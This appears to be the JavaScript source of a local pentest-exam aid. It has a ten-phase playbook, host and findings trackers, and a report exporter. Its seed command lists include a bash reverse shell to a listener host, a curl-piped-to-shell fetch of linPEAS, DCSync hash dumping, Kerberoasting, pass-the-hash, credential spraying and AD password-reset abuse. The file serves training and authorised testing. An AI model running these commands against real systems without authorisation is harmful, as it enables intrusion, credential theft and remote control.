/* ==========================================================================
   CPTS Exam Mode - battle station
   Shares the same command data as the main library (window.COMMAND_DATA from
   js/commands.js). Adds: global variable substitution, a 10-phase methodology
   playbook, host tracker, findings log, attack-path narrative, report export.
   All engagement state persists in localStorage (this is a local file app,
   your own notes + public commands - no server).
   ========================================================================== */

(function () {
  "use strict";

  const LIB = (window.COMMAND_DATA && window.COMMAND_DATA.commands) || [];

  /* ---------- Global variables shown in the bar ----------
     The variable VOCABULARY (canonical keys + aliases) is defined ONCE in js/vars.js and shared
     with the main app. Here we only choose WHICH vars the exam bar shows and their example
     placeholders; labels come from the shared registry. Substitution below is alias-aware, so a
     seed/command written with <target>/<host>/<rhost> fills from the single `ip` value. */
  const EXAM_KEYS = ["ip", "domain", "dc_ip", "dc_host", "user", "password", "nt_hash", "lhost", "lport", "interface", "port", "url", "wordlist"];
  const EX_PH = {
    ip: "10.10.10.5", domain: "corp.local", dc_ip: "10.10.10.2", dc_host: "DC01", user: "j.doe",
    password: "Passw0rd!", nt_hash: "aad3b4...", lhost: "10.10.14.2", lport: "4444",
    interface: "tun0", port: "445", url: "http://...", wordlist: "rockyou.txt"
  };
  const REG = window.VAR_BY_KEY || {};
  const FALLBACK_LABEL = { ip: "TARGET IP", nt_hash: "NT HASH", interface: "NIC", password: "PASS" };
  const VAR_DEFS = EXAM_KEYS.map(function (k) {
    const label = (REG[k] && REG[k].label) ? REG[k].label.toUpperCase() : (FALLBACK_LABEL[k] || k.toUpperCase());
    return { key: k, label: label, ph: EX_PH[k] || "" };
  });
  const canonKey = window.canonVar || function (t) { return t; };

  // Seed {{VAR}} -> library <placeholder> name
  const SEED_VARMAP = {
    TARGET: "ip", DOMAIN: "domain", DC_IP: "dc_ip", DC_HOST: "dc_host",
    USER: "user", PASS: "password", HASH: "nt_hash", LHOST: "lhost",
    LPORT: "lport", NIC: "interface", WORDLIST: "wordlist", DIRLIST: "wordlist"
  };

  function normalizeSeed(cmd) {
    return cmd.replace(/\{\{(\w+)\}\}/g, function (_, v) {
      const k = SEED_VARMAP[v] || v.toLowerCase();
      return "<" + k + ">";
    });
  }

  /* ---------- Methodology phases: checklist + curated seed commands ---------- */
  const PHASES = [
    {
      id: 1, name: "Network / Host Discovery", icon: "fa-network-wired",
      checklist: [
        "Ping sweep / host discovery across in-scope range",
        "Full TCP port scan (all ports, not top 1000)",
        "Service/version scan on open ports",
        "UDP scan on common ports",
        "Record every open port and service in the Hosts tab"
      ],
      seed: [
        { tool: "nmap", title: "Host discovery ping sweep", priv: false, cmd: "nmap -sn <ip>/24 -oA hosts", desc: "Find live hosts in the subnet." },
        { tool: "nmap", title: "Full TCP port scan", priv: false, cmd: "nmap -p- --min-rate 5000 -T4 <ip> -oA <ip>_allports", desc: "All 65535 ports. Never rely on top-1000 only." },
        { tool: "nmap", title: "Service/version + default scripts", priv: false, cmd: "nmap -sCV -p<port> <ip> -oA <ip>_services", desc: "Run after full scan, feed in the open ports found." },
        { tool: "nmap", title: "Top UDP ports", priv: true, cmd: "sudo nmap -sU --top-ports 100 <ip> -oA <ip>_udp", desc: "SNMP, DNS, TFTP often hide here." }
      ]
    },
    {
      id: 2, name: "Per-Service Enumeration", icon: "fa-magnifying-glass",
      checklist: [
        "For EVERY open service, enumerate before moving on - no tunnel vision",
        "SMB (139/445): shares, null session, users, versions",
        "LDAP (389/636): domain info, users, naming context",
        "Kerberos (88): user enum, AS-REP roastable",
        "DNS (53): zone transfer, subdomains",
        "FTP (21): anon login, writable",
        "SNMP (161): community strings, walk",
        "DB ports (1433/3306/5432): default creds, access"
      ],
      seed: [
        { tool: "netexec", title: "SMB share enum", priv: false, cmd: "netexec smb <ip> -u '<user>' -p '<password>' --shares", desc: "List shares and access. Use -u '' -p '' for null session." },
        { tool: "netexec", title: "SMB null session", priv: false, cmd: "netexec smb <ip> -u '' -p '' --shares", desc: "Unauthenticated share check." },
        { tool: "netexec", title: "SMB RID brute (user enum)", priv: false, cmd: "netexec smb <ip> -u '<user>' -p '<password>' --rid-brute", desc: "Enumerate domain users via RID cycling." },
        { tool: "netexec", title: "LDAP domain info", priv: false, cmd: "netexec ldap <dc_ip> -u '<user>' -p '<password>' --query '(objectClass=domain)' ''", desc: "Pull domain naming context and basics." },
        { tool: "snmpwalk", title: "SNMP walk public", priv: false, cmd: "snmpwalk -v2c -c public <ip>", desc: "Community string 'public' often exposes system info." }
      ]
    },
    {
      id: 3, name: "Web Enumeration", icon: "fa-globe",
      checklist: [
        "Directory/file brute force",
        "Vhost / subdomain enum",
        "Tech stack fingerprint",
        "Default creds on any login",
        "Source / comments / JS files for secrets",
        "Known CVEs for identified software/version",
        "Test: SQLi, upload, LFI/RFI, SSTI, cmd injection, IDOR, auth bypass",
        "Look for exposed .git, backups, config files"
      ],
      seed: [
        { tool: "feroxbuster", title: "Directory brute force", priv: false, cmd: "feroxbuster -u <url> -w <wordlist> -x php,html,txt", desc: "Recursive content discovery." },
        { tool: "ffuf", title: "Vhost fuzzing", priv: false, cmd: "ffuf -w <wordlist> -u <url> -H 'Host: FUZZ.<domain>' -fs 0", desc: "Discover virtual hosts. Filter by size after a baseline." },
        { tool: "whatweb", title: "Tech fingerprint", priv: false, cmd: "whatweb -a3 <url>", desc: "Identify stack and versions for CVE lookup." },
        { tool: "nuclei", title: "Known-vuln scan", priv: false, cmd: "nuclei -u <url>", desc: "Fast template-based known CVE/misconfig check." }
      ]
    },
    {
      id: 4, name: "Foothold / Initial Access", icon: "fa-door-open",
      checklist: [
        "Confirm the exploit works, capture evidence",
        "Get a stable shell (upgrade to full TTY)",
        "Log the finding immediately with screenshot",
        "Note exactly how you got in (for report + to repeat it)"
      ],
      seed: [
        { tool: "nc", title: "Netcat listener", priv: false, cmd: "nc -lvnp <lport>", desc: "Catch reverse shells." },
        { tool: "bash", title: "Bash reverse shell", priv: false, cmd: "bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'", desc: "Classic Linux reverse shell payload." },
        { tool: "python", title: "Upgrade to full TTY", priv: false, cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", desc: "Then Ctrl-Z, stty raw -echo; fg, export TERM=xterm." }
      ]
    },
    {
      id: 5, name: "Local Enumeration", icon: "fa-user-secret",
      checklist: [
        "Linux: users, sudo -l, SUID/SGID, capabilities, cron, writable paths",
        "Linux: config files, history, ssh keys, .env, internal services (ss -tlpn)",
        "Windows: whoami /all, systeminfo, installed software",
        "Windows: services (unquoted paths, weak perms), stored creds, registry",
        "Windows: AlwaysInstallElevated, token privileges",
        "Note other NICs - every host is a potential pivot"
      ],
      seed: [
        { tool: "linpeas", title: "Run linPEAS", priv: false, cmd: "curl <lhost>/linpeas.sh | sh", desc: "Automated Linux privesc enumeration." },
        { tool: "bash", title: "Sudo rights", priv: false, cmd: "sudo -l", desc: "Check what current user can run as root." },
        { tool: "bash", title: "SUID binaries", priv: false, cmd: "find / -perm -4000 -type f 2>/dev/null", desc: "Cross-check hits against GTFOBins." },
        { tool: "cmd", title: "Token privileges", priv: false, cmd: "whoami /priv", desc: "Look for SeImpersonate, SeBackup, etc." }
      ]
    },
    {
      id: 6, name: "Privilege Escalation", icon: "fa-arrow-up-right-dots",
      checklist: [
        "Work through local-enum findings systematically",
        "Try lowest-effort path first (cred reuse, sudo, service misconfig)",
        "Capture proof of elevated access",
        "Log the finding"
      ],
      seed: [
        { tool: "printspoofer", title: "SeImpersonate abuse", priv: false, cmd: "PrintSpoofer64.exe -i -c cmd", desc: "Escalate when SeImpersonatePrivilege is present." },
        { tool: "bash", title: "Writable /etc/passwd check", priv: false, cmd: "ls -la /etc/passwd", desc: "If writable, add a root-uid user." }
      ]
    },
    {
      id: 7, name: "Active Directory", icon: "fa-sitemap",
      checklist: [
        "BloodHound collection + analyze shortest paths to DA",
        "Domain users, groups, computers, password policy, GPO",
        "Kerberoastable + AS-REP roastable accounts",
        "ACL abuse paths (GenericAll/GenericWrite/WriteDACL)",
        "Delegation (unconstrained/constrained/RBCD)",
        "Techniques cold: Kerberoast, AS-REP, PtH/PtT/OverPass, DCSync, ACL chains, delegation, trust/GPO abuse"
      ],
      seed: [
        { tool: "bloodhound", title: "BloodHound collection", priv: false, cmd: "bloodhound-python -d <domain> -u '<user>' -p '<password>' -ns <dc_ip> -c all", desc: "Collect then analyze shortest paths to Domain Admin." },
        { tool: "impacket", title: "Kerberoast", priv: false, cmd: "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc_ip> -request", desc: "Request TGS for SPN accounts, crack offline (hashcat -m 13100)." },
        { tool: "impacket", title: "AS-REP roast", priv: false, cmd: "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass", desc: "Target accounts without Kerberos preauth (hashcat -m 18200)." },
        { tool: "impacket", title: "DCSync", priv: true, cmd: "impacket-secretsdump <domain>/<user>:<password>@<dc_ip>", desc: "Dump domain hashes with replication rights." },
        { tool: "netexec", title: "Pass-the-Hash exec", priv: false, cmd: "netexec smb <ip> -u '<user>' -H <nt_hash> -x whoami", desc: "Authenticate with NTLM hash instead of password." },
        { tool: "bloodyAD", title: "ACL abuse (generic)", priv: false, cmd: "bloodyAD --host <dc_ip> -d <domain> -u '<user>' -p '<password>' set password <target> <newpass>", desc: "Abuse GenericAll/WriteDACL edges found in BloodHound." }
      ]
    },
    {
      id: 8, name: "Pivoting / Tunneling", icon: "fa-route",
      checklist: [
        "Identify dual-homed hosts (multiple NICs) as pivot points",
        "Set up tunnel (ligolo-ng preferred - learn it cold)",
        "Route to newly reachable segment",
        "Re-run discovery/enum on the new segment (back to Phase 1)",
        "Track each pivot hop in the Hosts tab"
      ],
      seed: [
        { tool: "ligolo-ng", title: "Proxy: create tun interface", priv: true, cmd: "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up", desc: "One-time setup of the ligolo interface." },
        { tool: "ligolo-ng", title: "Proxy: start listener", priv: false, cmd: "./proxy -selfcert -laddr 0.0.0.0:11601", desc: "Run on your attack box. Agents connect back here." },
        { tool: "ligolo-ng", title: "Agent: connect from pivot host", priv: false, cmd: "./agent -connect <lhost>:11601 -ignore-cert", desc: "Run on the compromised dual-homed host." },
        { tool: "ligolo-ng", title: "Route to internal subnet", priv: true, cmd: "sudo ip route add <internal_subnet>/24 dev ligolo", desc: "After session start, add the far subnet. Then re-enumerate it from Phase 1." }
      ]
    },
    {
      id: 9, name: "Lateral Movement", icon: "fa-people-arrows",
      checklist: [
        "Reuse found creds/hashes across hosts",
        "WinRM / PsExec / WMI / SMBexec with creds",
        "Spray where appropriate",
        "Each new host -> restart at Phase 5 (local enum)"
      ],
      seed: [
        { tool: "evil-winrm", title: "WinRM session", priv: false, cmd: "evil-winrm -i <ip> -u '<user>' -p '<password>'", desc: "Interactive shell over WinRM. Supports -H for hash." },
        { tool: "impacket", title: "PsExec (SYSTEM)", priv: false, cmd: "impacket-psexec <domain>/<user>:<password>@<ip>", desc: "SYSTEM shell via service creation. Noisy but reliable." },
        { tool: "netexec", title: "Credential spray", priv: false, cmd: "netexec smb <targets.txt> -u '<user>' -p '<password>' --continue-on-success", desc: "Reuse creds across hosts to find where they land." }
      ]
    },
    {
      id: 10, name: "Reporting", icon: "fa-file-lines",
      checklist: [
        "Every finding logged with description, repro steps, evidence, impact, remediation, CVSS",
        "Executive summary (business impact, plain language)",
        "Technical findings section",
        "Attack path narrative (how you chained it)",
        "Remediation roadmap prioritized by severity",
        "Appendix: commands, scope, methodology",
        "Proofread formatting before submit - people fail on this"
      ],
      seed: []
    }
  ];

  // Which methodology phase a library command belongs to.
  const WEB_ENUM_SUBS = new Set(["Web Crawling", "Web Fingerprinting", "Virtual Hosts", "Subdomains", "Search Engine OSINT", "WHOIS"]);
  function libPhase(c) {
    const cat = c.category, sub = c.subcategory || "";
    switch (cat) {
      case "Enumeration":
        if (sub === "Network Discovery") return 1;
        if (WEB_ENUM_SUBS.has(sub)) return 3;
        return 2;
      case "Web Exploitation":
      case "Vulnerability Assessment":
        return 3;
      case "Exploitation":
        return 4;
      case "Post-Exploitation":
        return sub === "Credential Dumping" ? 7 : 5;
      case "Password Attacks":
        if (sub === "Hash Cracking") return 7;
        if (sub === "Brute Forcing") return 2;
        return 3;
      case "Pivoting & Tunneling":
        return 8;
      case "Lateral Movement":
        return 9;
      default:
        return null;
    }
  }

  /* ---------- State (localStorage) ---------- */
  const K = { vars: "exam_vars", checks: "exam_checks", hosts: "exam_hosts", findings: "exam_findings", path: "exam_path", eng: "exam_eng" };
  const load = (k, d) => { try { return JSON.parse(localStorage.getItem(k)) || d; } catch (e) { return d; } };
  const save = (k, v) => localStorage.setItem(k, JSON.stringify(v));

  let vars = load(K.vars, {});
  let checks = load(K.checks, {});
  let hosts = load(K.hosts, []);
  let findings = load(K.findings, []);
  let path = load(K.path, []);
  let eng = load(K.eng, { name: "", tester: "" });

  const uid = () => Math.random().toString(36).slice(2, 9);
  const esc = (s) => (s == null ? "" : String(s)).replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));

  /* ---------- Substitution engine ---------- */
  // Returns plain substituted string (unfilled placeholders left as <name>).
  function subst(cmd) {
    return cmd.replace(/<([a-z0-9_]+)>/gi, function (m, name) {
      const key = canonKey(name.toLowerCase()) || name.toLowerCase();   // alias-aware
      const v = vars[key];
      return (v !== undefined && v !== "") ? v : m;
    });
  }
  // Returns HTML: filled values plain, unfilled placeholders highlighted.
  function substHTML(cmd) {
    return esc(cmd).replace(/&lt;([a-z0-9_]+)&gt;/gi, function (m, name) {
      const key = canonKey(name.toLowerCase()) || name.toLowerCase();
      const v = vars[key];
      if (v !== undefined && v !== "") return esc(v);
      return '<span class="ph-open">&lt;' + esc(name) + '&gt;</span>';
    });
  }

  /* ---------- Toast ---------- */
  let toastT;
  function toast(msg) {
    const t = document.getElementById("toast");
    t.textContent = msg; t.classList.add("show");
    clearTimeout(toastT); toastT = setTimeout(() => t.classList.remove("show"), 1600);
  }
  function copy(text) {
    navigator.clipboard.writeText(text).then(() => toast("Copied")).catch(() => toast("Copy failed"));
  }

  /* ================= VARIABLE BAR ================= */
  function renderVarBar() {
    const wrap = document.getElementById("vbFields");
    wrap.innerHTML = VAR_DEFS.map(function (d) {
      const val = vars[d.key] || "";
      return '<div class="vb-field"><label>' + esc(d.label) + '</label>' +
        '<input data-var="' + d.key + '" value="' + esc(val) + '" placeholder="' + esc(d.ph) + '"' +
        (val ? ' class="filled"' : "") + '></div>';
    }).join("");
    wrap.querySelectorAll("input").forEach(function (inp) {
      inp.addEventListener("input", function () {
        const k = inp.dataset.var;
        vars[k] = inp.value;
        inp.classList.toggle("filled", !!inp.value);
        save(K.vars, vars);
        refreshCommands();
      });
    });
  }

  /* ================= PLAYBOOK ================= */
  function cmdCardHTML(c, priv) {
    const badges = '<span class="tool-badge">' + esc(c.tool || "") + "</span>" +
      ((priv || c.priv) ? '<span class="priv-badge">root/admin</span>' : "");
    const desc = c.desc ? '<div class="cmd-desc">' + esc(c.desc) + "</div>" : "";
    return '<div class="cmd" data-raw="' + esc(c.cmd) + '">' +
      '<div class="cmd-top"><span class="cmd-title">' + esc(c.title) + "</span>" + badges + "</div>" +
      desc +
      '<div class="cmd-line"><div class="cmd-code">' + substHTML(c.cmd) + "</div>" +
      '<button class="copy-btn" title="Copy filled command"><i class="fas fa-copy"></i></button></div>' +
      "</div>";
  }

  // Pre-index library commands by phase.
  const libByPhase = {};
  LIB.forEach(function (c) {
    const p = libPhase(c);
    if (!p) return;
    (libByPhase[p] = libByPhase[p] || []).push({
      tool: (c.tools && c.tools[0]) || "", title: c.name, cmd: c.command,
      desc: c.description, priv: (c.requires || []).some(function (r) { return /admin|root|dba|system/i.test(r); })
    });
  });

  function renderPlaybook() {
    const host = document.getElementById("phases");
    host.innerHTML = PHASES.map(function (p) {
      const lib = libByPhase[p.id] || [];
      const total = p.seed.length + lib.length;
      const checklist = '<div class="cl-title">Checklist</div><ul class="checklist">' +
        p.checklist.map(function (item, i) {
          const id = "p" + p.id + "_" + i;
          const done = checks[id] ? " done" : "";
          return '<li class="' + done.trim() + '" data-chk="' + id + '"><input type="checkbox"' +
            (checks[id] ? " checked" : "") + '><label>' + esc(item) + "</label></li>";
        }).join("") + "</ul>";
      const seedBlock = p.seed.length
        ? '<div class="cmd-group-title">Core commands</div>' + p.seed.map(function (c) { return cmdCardHTML(c, false); }).join("")
        : "";
      const libBlock = lib.length
        ? '<div class="cmd-group-title">From your library (' + lib.length + ')</div>' +
          lib.map(function (c) { return cmdCardHTML(c, false); }).join("")
        : "";
      return '<div class="phase" data-phase="' + p.id + '">' +
        '<div class="phase-head"><span class="phase-num">' + p.id + "</span>" +
        "<h3>" + esc(p.name) + "</h3>" +
        '<span class="p-count">' + total + " cmds</span>" +
        '<i class="fas fa-chevron-down chev"></i></div>' +
        '<div class="phase-body">' + checklist + seedBlock + libBlock + "</div></div>";
    }).join("");

    // collapse/expand
    host.querySelectorAll(".phase-head").forEach(function (h) {
      h.addEventListener("click", function (e) {
        if (e.target.closest("input,label,button")) return;
        h.parentElement.classList.toggle("collapsed");
      });
    });
    // checklist toggles
    host.querySelectorAll("[data-chk] input").forEach(function (inp) {
      inp.addEventListener("change", function () {
        const li = inp.closest("[data-chk]"); const id = li.dataset.chk;
        checks[id] = inp.checked; save(K.checks, checks);
        li.classList.toggle("done", inp.checked);
      });
    });
    // copy buttons
    host.querySelectorAll(".copy-btn").forEach(function (btn) {
      btn.addEventListener("click", function () {
        copy(subst(btn.closest(".cmd").dataset.raw));
      });
    });
  }

  // Re-render just the command code spans when variables change (cheap).
  function refreshCommands() {
    document.querySelectorAll("#phases .cmd").forEach(function (el) {
      el.querySelector(".cmd-code").innerHTML = substHTML(el.dataset.raw);
    });
  }

  function applyPlaybookFilter() {
    const q = (document.getElementById("pbSearch").value || "").toLowerCase();
    const hide = document.getElementById("hidePriv").checked;
    document.querySelectorAll("#phases .phase").forEach(function (ph) {
      let visible = 0;
      ph.querySelectorAll(".cmd").forEach(function (c) {
        const txt = (c.querySelector(".cmd-title").textContent + " " + c.dataset.raw + " " +
          (c.querySelector(".cmd-desc") ? c.querySelector(".cmd-desc").textContent : "")).toLowerCase();
        const isPriv = !!c.querySelector(".priv-badge");
        const ok = (!q || txt.indexOf(q) !== -1) && (!hide || !isPriv);
        c.style.display = ok ? "" : "none";
        if (ok) visible++;
      });
      // hide command-group titles that have no visible cmd after them is a nicety we skip;
      // keep phase visible if it has any match or if no query.
      ph.style.display = (!q || visible > 0) ? "" : "none";
    });
  }

  /* ================= HOSTS ================= */
  const HOST_COLS = ["ip", "hostname", "os", "creds", "access", "pivots", "notes"];
  function renderHosts() {
    const body = document.getElementById("hostsBody");
    body.innerHTML = hosts.map(function (h) {
      return '<tr data-id="' + h.id + '">' + HOST_COLS.map(function (col) {
        return "<td><input data-col=\"" + col + "\" value=\"" + esc(h[col] || "") + "\"></td>";
      }).join("") + '<td><button class="row-del" title="Delete"><i class="fas fa-trash"></i></button></td></tr>';
    }).join("");
    document.getElementById("hostsEmpty").style.display = hosts.length ? "none" : "block";
    document.getElementById("hostsBadge").textContent = hosts.length;
    body.querySelectorAll("tr").forEach(function (tr) {
      const h = hosts.find(function (x) { return x.id === tr.dataset.id; });
      tr.querySelectorAll("input").forEach(function (inp) {
        inp.addEventListener("input", function () { h[inp.dataset.col] = inp.value; save(K.hosts, hosts); });
      });
      tr.querySelector(".row-del").addEventListener("click", function () {
        hosts = hosts.filter(function (x) { return x.id !== tr.dataset.id; });
        save(K.hosts, hosts); renderHosts();
      });
    });
  }

  /* ================= FINDINGS ================= */
  const SEVS = ["Critical", "High", "Medium", "Low", "Info"];
  function renderFindings() {
    const list = document.getElementById("findingsList");
    list.innerHTML = findings.map(function (f) {
      const sevOpts = SEVS.map(function (s) { return '<option' + (f.severity === s ? " selected" : "") + ">" + s + "</option>"; }).join("");
      const hostOpts = ['<option value="">- host -</option>'].concat(hosts.map(function (h) {
        const lbl = (h.ip || "?") + (h.hostname ? " / " + h.hostname : "");
        return '<option value="' + esc(h.ip || "") + '"' + (f.host === (h.ip || "") ? " selected" : "") + ">" + esc(lbl) + "</option>";
      })).join("");
      return '<div class="finding" data-id="' + f.id + '">' +
        '<div class="fnd-head"><span class="sev ' + esc(f.severity || "Info") + '">' + esc(f.severity || "Info") + "</span>" +
        '<button class="row-del" title="Delete finding"><i class="fas fa-trash"></i></button></div>' +
        '<div class="fnd-grid">' +
        fld("full", "Title", "title", f.title, "text") +
        '<div class="fnd-field"><label>Severity</label><select data-col="severity">' + sevOpts + "</select></div>" +
        '<div class="fnd-field"><label>Host</label><select data-col="host">' + hostOpts + "</select></div>" +
        fld("", "CVSS", "cvss", f.cvss, "text") +
        fld("", "Evidence / screenshot path", "evidence", f.evidence, "text") +
        fldArea("full", "Command that worked", "command", f.command) +
        fldArea("full", "Steps to reproduce", "steps", f.steps) +
        fldArea("full", "Impact", "impact", f.impact) +
        fldArea("full", "Remediation", "remediation", f.remediation) +
        "</div></div>";
    }).join("");
    document.getElementById("findingsEmpty").style.display = findings.length ? "none" : "block";
    document.getElementById("findingsBadge").textContent = findings.length;
    list.querySelectorAll(".finding").forEach(function (card) {
      const f = findings.find(function (x) { return x.id === card.dataset.id; });
      card.querySelectorAll("[data-col]").forEach(function (inp) {
        inp.addEventListener("input", function () {
          f[inp.dataset.col] = inp.value; save(K.findings, findings);
          if (inp.dataset.col === "severity") renderFindings();
        });
      });
      card.querySelector(".row-del").addEventListener("click", function () {
        findings = findings.filter(function (x) { return x.id !== card.dataset.id; });
        save(K.findings, findings); renderFindings();
      });
    });
    function fld(cls, label, col, val, type) {
      return '<div class="fnd-field ' + cls + '"><label>' + label + '</label><input type="' + type + '" data-col="' + col + '" value="' + esc(val || "") + '"></div>';
    }
    function fldArea(cls, label, col, val) {
      return '<div class="fnd-field ' + cls + '"><label>' + label + '</label><textarea data-col="' + col + '">' + esc(val || "") + "</textarea></div>";
    }
  }

  /* ================= ATTACK PATH ================= */
  function renderPath() {
    const list = document.getElementById("pathList");
    list.innerHTML = path.map(function (s, i) {
      return '<div class="step" data-id="' + s.id + '"><span class="step-num">' + (i + 1) + "</span>" +
        '<textarea data-col="text" placeholder="from <host/access> via <technique> to <host/access>">' + esc(s.text || "") + "</textarea>" +
        '<div class="step-ctrl"><button data-act="up" title="Move up"><i class="fas fa-arrow-up"></i></button>' +
        '<button data-act="down" title="Move down"><i class="fas fa-arrow-down"></i></button>' +
        '<button data-act="del" title="Delete"><i class="fas fa-trash"></i></button></div></div>';
    }).join("");
    document.getElementById("pathEmpty").style.display = path.length ? "none" : "block";
    document.getElementById("pathBadge").textContent = path.length;
    list.querySelectorAll(".step").forEach(function (el) {
      const idx = path.findIndex(function (x) { return x.id === el.dataset.id; });
      el.querySelector("textarea").addEventListener("input", function (e) { path[idx].text = e.target.value; save(K.path, path); });
      el.querySelectorAll(".step-ctrl button").forEach(function (b) {
        b.addEventListener("click", function () {
          const act = b.dataset.act;
          if (act === "del") { path.splice(idx, 1); }
          else if (act === "up" && idx > 0) { const t = path[idx - 1]; path[idx - 1] = path[idx]; path[idx] = t; }
          else if (act === "down" && idx < path.length - 1) { const t = path[idx + 1]; path[idx + 1] = path[idx]; path[idx] = t; }
          save(K.path, path); renderPath();
        });
      });
    });
  }

  /* ================= REPORT ================= */
  function buildReport() {
    const d = new Date().toISOString().slice(0, 10);
    const L = [];
    L.push("# Penetration Test Report" + (eng.name ? " - " + eng.name : ""));
    L.push("");
    L.push("- Tester: " + (eng.tester || "_TBD_"));
    L.push("- Date: " + d);
    const scope = VAR_DEFS.filter(function (v) { return vars[v.key]; })
      .map(function (v) { return v.label + " = " + vars[v.key]; });
    if (scope.length) { L.push("- Engagement variables: " + scope.join("; ")); }
    L.push("");
    L.push("## Executive Summary");
    L.push("");
    const crit = findings.filter(function (f) { return f.severity === "Critical"; }).length;
    const high = findings.filter(function (f) { return f.severity === "High"; }).length;
    L.push("_TODO: business-impact summary in plain language._ This assessment identified " +
      findings.length + " finding(s)" + (crit || high ? " including " + crit + " critical and " + high + " high severity" : "") + ".");
    L.push("");

    L.push("## Host / Credential Inventory");
    L.push("");
    if (hosts.length) {
      L.push("| IP | Hostname | OS | Creds found | Access | Pivots to | Notes |");
      L.push("|----|----------|----|-------------|--------|-----------|-------|");
      hosts.forEach(function (h) {
        L.push("| " + [h.ip, h.hostname, h.os, h.creds, h.access, h.pivots, h.notes]
          .map(function (x) { return (x || "").replace(/\|/g, "\\|") || "-"; }).join(" | ") + " |");
      });
    } else { L.push("_No hosts recorded._"); }
    L.push("");

    L.push("## Findings");
    L.push("");
    if (findings.length) {
      const order = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 };
      findings.slice().sort(function (a, b) { return (order[a.severity] ?? 5) - (order[b.severity] ?? 5); })
        .forEach(function (f, i) {
          L.push("### " + (i + 1) + ". " + (f.title || "Untitled") + " [" + (f.severity || "Info") + "]");
          L.push("");
          if (f.host) L.push("- Affected host: " + f.host);
          if (f.cvss) L.push("- CVSS: " + f.cvss);
          if (f.evidence) L.push("- Evidence: " + f.evidence);
          L.push("");
          if (f.command) { L.push("Command used:"); L.push(""); L.push("```bash"); L.push(f.command); L.push("```"); L.push(""); }
          if (f.steps) { L.push("**Steps to reproduce**"); L.push(""); L.push(f.steps); L.push(""); }
          if (f.impact) { L.push("**Impact**"); L.push(""); L.push(f.impact); L.push(""); }
          if (f.remediation) { L.push("**Remediation**"); L.push(""); L.push(f.remediation); L.push(""); }
        });
    } else { L.push("_No findings recorded._"); L.push(""); }

    L.push("## Attack Path Narrative");
    L.push("");
    if (path.length) { path.forEach(function (s, i) { L.push((i + 1) + ". " + (s.text || "")); }); }
    else { L.push("_No attack path recorded._"); }
    L.push("");

    L.push("## Remediation Roadmap");
    L.push("");
    L.push("_Prioritize by severity: Critical -> High -> Medium -> Low._");
    L.push("");
    L.push("---");
    L.push("_Generated by CPTS Exam Mode on " + d + "._");
    return L.join("\n");
  }

  function renderReport() {
    document.getElementById("reportPreview").textContent = buildReport();
  }

  /* ================= TABS ================= */
  function switchTab(name) {
    document.querySelectorAll("#examTabs .tab").forEach(function (t) { t.classList.toggle("active", t.dataset.tab === name); });
    document.querySelectorAll(".pane").forEach(function (p) { p.classList.toggle("active", p.id === "pane-" + name); });
    if (name === "report") renderReport();
    if (name === "findings") renderFindings(); // refresh host dropdowns
  }

  /* ================= INIT ================= */
  function init() {
    document.getElementById("examSub").textContent = "CPTS Battle Station - " + LIB.length + " commands loaded";
    renderVarBar();
    renderPlaybook();
    renderHosts();
    renderFindings();
    renderPath();

    // engagement fields
    const en = document.getElementById("engName"), et = document.getElementById("engTester");
    en.value = eng.name; et.value = eng.tester;
    en.addEventListener("input", function () { eng.name = en.value; save(K.eng, eng); renderReport(); });
    et.addEventListener("input", function () { eng.tester = et.value; save(K.eng, eng); renderReport(); });

    document.querySelectorAll("#examTabs .tab").forEach(function (t) {
      t.addEventListener("click", function () { switchTab(t.dataset.tab); });
    });
    document.getElementById("pbSearch").addEventListener("input", applyPlaybookFilter);
    document.getElementById("hidePriv").addEventListener("change", applyPlaybookFilter);
    document.getElementById("expandAll").addEventListener("click", function () {
      document.querySelectorAll(".phase").forEach(function (p) { p.classList.remove("collapsed"); });
    });
    document.getElementById("collapseAll").addEventListener("click", function () {
      document.querySelectorAll(".phase").forEach(function (p) { p.classList.add("collapsed"); });
    });
    document.getElementById("clearVars").addEventListener("click", function () {
      vars = {}; save(K.vars, vars); renderVarBar(); refreshCommands(); toast("Variables cleared");
    });
    document.getElementById("addHost").addEventListener("click", function () {
      hosts.push({ id: uid() }); save(K.hosts, hosts); renderHosts();
    });
    document.getElementById("addFinding").addEventListener("click", function () {
      findings.push({ id: uid(), severity: "Medium" }); save(K.findings, findings); renderFindings();
    });
    document.getElementById("addStep").addEventListener("click", function () {
      path.push({ id: uid(), text: "" }); save(K.path, path); renderPath();
    });
    document.getElementById("copyReport").addEventListener("click", function () { copy(buildReport()); });
    document.getElementById("downloadReport").addEventListener("click", function () {
      const blob = new Blob([buildReport()], { type: "text/markdown" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = (eng.name ? eng.name.replace(/[^\w.-]+/g, "_") : "cpts") + "_report_" + new Date().toISOString().slice(0, 10) + ".md";
      a.click(); URL.revokeObjectURL(a.href); toast("Report downloaded");
    });

    // Ctrl+K focuses playbook search
    document.addEventListener("keydown", function (e) {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") { e.preventDefault(); document.getElementById("pbSearch").focus(); }
    });
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", init);
  else init();
})();
